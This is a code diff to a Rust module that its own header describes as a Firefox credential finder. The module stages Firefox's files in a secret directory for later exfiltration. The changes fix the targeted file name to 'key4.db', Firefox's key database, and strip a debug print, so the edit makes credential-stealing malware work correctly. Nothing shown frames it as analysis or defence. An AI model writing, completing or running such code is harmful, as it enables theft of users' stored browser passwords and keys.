@@ -1,4 +1,4 @@
-/* Firefox Credential Finder
+/* Firefox credential Finder
  * Author: Chandler Hake    
  * Description: This module copies valuable Firefox files to a 
  * secret directory that will be exfilled at a later time
@@ -54,12 +54,11 @@ pub fn run() -> String {
 
     ScanDir::dirs().read(path_dir, |iter| {
         for (entry, name) in iter {
-            println!("File {:?} has full path {:?}", name, entry.path());
             dir_list.push(String::from(entry.path().as_path().to_string_lossy()));
         }
     }).unwrap();
 
-    let ret = find_files(dir_list.clone(), "/keys4.db");
+    let ret = find_files(dir_list.clone(), "/key4.db");
     if ret == 1{
         return "Failed!".to_string();
     }
